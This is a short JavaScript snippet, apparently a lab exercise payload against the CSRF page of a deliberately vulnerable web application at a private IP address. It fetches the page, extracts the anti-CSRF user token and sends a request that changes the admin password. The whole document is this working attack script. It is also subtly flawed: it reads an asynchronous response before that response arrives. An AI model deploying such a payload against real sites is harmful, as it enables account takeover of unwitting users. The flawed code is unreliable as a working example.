var xhttp = new XMLHttpRequest();
var response;
xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200) {response = this.responseText;}};

// Get the user token
xhttp.open("GET", "http://10.10.195.82/vulnerabilities/csrf/", true);
xhttp.send();
var token = response.match(/value=\'(.*)\'/gm)[0];
token = token.split("'")[1];

// Change the user admin password using the token:
xhttp.open("GET", "http://10.10.195.82/vulnerabilities/csrf/?password_new=MY_NEW_PASS&password_conf=MY_NEW_PASS&Change=Change&user_token=" + token + "#");
xhttp.send();
